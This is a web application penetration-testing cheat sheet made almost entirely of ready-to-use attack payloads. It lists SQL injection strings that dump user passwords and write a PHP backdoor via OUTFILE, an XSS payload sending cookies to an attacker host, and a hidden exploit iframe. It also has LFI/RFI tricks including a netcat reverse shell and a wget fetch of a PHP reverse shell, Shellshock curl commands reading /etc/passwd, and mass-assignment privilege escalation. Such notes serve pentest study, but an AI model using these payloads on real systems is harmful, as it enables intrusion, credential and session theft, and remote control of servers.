# Web Applications

- [Information Gathering](#information-gathering)
- [Testing](#testing)
- [Authorization](#authorization)
- [Path Traversal](#path-traversal)
- [SQL Enumerate](#sql-enumerate)
- [SQL Blind](#sql-blind)
- [SQL Web Shell](#sql-web-shell)
- [IFRAME](#iframe)
- [XSS](#xss)
- [Code Injection](#code-injection)
- [LFI](#lfi)
- [RFI](#rfi)
- [Command Injection](#command-injection)


## Information Gathering

Fingerprint Server HEAD request, httprint

Review Metadata Robots.txt, curl -O http://$ip/robots.txt

Enumerate Applications Spider, Dirb

Review comments nmap http-comments, wget recursive, curl?

Identify Entry points parameters, cookies, sessionids, verbs

Test by path, data flow, or race

Identify App Framework curl for X-Powered-By, look in comments, sourcecode, (php, aspx, jsp), Use whatweb

Fingerprint WebApp whatweb

Map WebApp architecture proxies, databases,

## Testing

Known Server Vulnerabilities, Administrative Interfaces

Configurations, logs viewable? php.ini, apache, .asa, .inc,

Check for sensitive info backups, usernames, passwords, tokens, keys,

Directory Enumeration Dirb

Web framework Default logins http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php
  https://www.netsparker.com/blog/web-security/svn-digger-better-lists-for-forced-browsing/
  
HTTP Methods PUT, DELETE, curl OPTIONS

HSTS Header $ curl -s -D- https://domain.com/ | grep Strict

Configuration Can you log in, sign up, upload files, download

Authentication error messages generic or do they give info

Password Attack guessable usernames, weak password & lockout policy, weak secret question/answer, password reset

Credentials over HTTP

Default credentials admin accounts, new accounts

Auth Bypass Forced browsing, parameter modification, session ID prediction, SQL injection

## Authorization

Path traversal/file includes request parameters used for file operations

  Unusual extensions, interesting parameter names, parameters in cookies
  
  Test internal files, local files, remote files
  
  Source code, hxxp://example.com/main.cgi?home=main.cgi
  
  Test with URL encoding and double URL encoding
  
Direct object reference find where user input is used to reference objects directly

‘ OR 1=1 -- in both fields

Capture post data with Burp
     
sqlmap –u $site/php --method post --data=”username=asdfasdf" --not-string="Username or Password is invalid”

## Path Traversal

dotdotpwn

dotslash                                    ../../../etc/passwd

starting path                           /var/www/files/../../../etc/password

file extension                         ../../../etc/passwd.png%2500

## SQL Enumerate

‘ OR 1=1 --

One record allowed             ‘ OR 1=1 LIMIT 1 --

If ticks are filtered                  \ (in username) or 1=1# (in password) username=’ \’ and password = ‘ or 1=1#

Sql query in URL                    username%3d’hacker’%20OR%201=1%3B%23

Add onto query                     ?limit=4%20union%20all%20select%20*%20from%20users

Remove SQL                           ?group=username (just delete it)

encoded spaces                    ‘%09OR%091=1%09--%09

comments                               ‘/**/OR/**/’1’=’1

unquoted integer                 id=2 OR 1=1

add new line                           id=2%0aOR 1=1

comment.php?id=738 order by 7
         
lang=' UNION ALL SELECT 1,user(),database(),4,@@version,6;#

lang=' UNION ALL SELECT 1,2,name,4,password,6 FROM users;#

MySQL
     
SELECT schema_name FROM information_schema.schemata;
SELECT table_name FROM information_schema.tables;
SELECT column_name FROM information_schema.columns;

MSSQL
     
SELECT name FROM sys.databases
SELECT name FROM sys.tables
SELECT name FROM sys.columns

ORACLE
SELECT owner FROM all_tables
SELECT table_name FROM all_tables
SELECT column_name FROM all_tab_columns

## SQL Blind
     
comment.php?id=738-sleep(5)

comment.php?id=738 union all select 1,2,3,4,load_file("c:/windows/system32/drivers/hosts"),6

comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE      'c:/xampp/htdocs/backdoor.php'

## SQL Web Shell
     
' UNION ALL SELECT 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php';#

## IFRAME

<iframe SRC="hxxp://$ip:81/exploit" height = "0" width = "0"></iframe>

## XSS

<script>new Image().src="hxxp://$ip:443/bogus.php?output="+document.cookie;</script>

sCript

<scr<script>ipt>
  
<a onmouseover=alert('Boo!'); /a>
  
prompt, confirm instead of alert

dude"; alert('Boo!');//

example8.php/%20%20method="POST">%20%20%20%20%20%20<scRipt>confirm('Boo!');</sCript>%20///

example9.php#<script>alert('Boo!'); </script> ////

## Code Injection

System %22.system(%27hostname%27)%3B%23 “.system (‘hostname’);#

complete code order=id)%3B}system(%27cat%20/etc/passwd%27)%3B%23 id);} system (‘cat /etc/passwd’);#

add on ‘ .system(‘uname –a’).’

## LFI

LFI If a phpinfo() file is present, it’s usually possible to get a shell

Just webroot? --> config files

More than webroot --> /etc/passwd

curl -v "http://$ip/" -b "lang=../../../../../etc/passwd"

Write files to server? --> PHP web shell

     <?php echo shell_exec("C:\\nc.exe $ip 443 -e cmd.exe");?>

page=../../../../etc/passwd

page=../../../../etc/passwd%00

hxxp://127.0.0.1/fileincl/example1.php?page=expect://ls

hxxp://192.168.183.128/fileincl/example1.php?page=php://input

<? system('wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php');?>

hxxp://192.168.155.131/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd

## RFI

%3F&cmd=C:\nc.exe%2010%2E11%2E0%2E30%20443%20%2De%20cmd%2Eexe

&LANG=../../../../../../../xampp/apache/logs/access.log%00

<?php echo shell_exec('ipconfig')'; ?>

## Command Injection

Commix

if fail, execute X || cat /etc/passwd

add a new line %0acat /etc/passwd

telnet telnet $ip 80, then: GET /path/to/page.php?ip=127.0.0.1|cat+/etc/passwd

/search.php?storedsearch=\$mysearch%3dwahh;%20echo%20file_get_contents('/etc/passwd')

curl -A "() { 42;};echo;/bin/cat /etc/passwd" $url

curl -A " () { 42;};echo;/usr/bin/id " $url

curl -A " () { 42;};echo; ping -c 4 $ip " $url

curl -A " () { 42;};echo; nslookup $site " $url

First try netcat backdoor, if no then try php web shell

### Authorization
     
Navigate to pages without authorization
     
Navigate to other users pages after authentication
     
Navigate to other users links (can't view but can edit)

### Mass Assignment

Add parameter &user%5Badmin%5D=1 ‘user [admin] = 1’
  
Update value update_profile?user[username]=test&user[admin]=1

Add value update_profile?user[company_id]=2

### Third Party

Yasuo
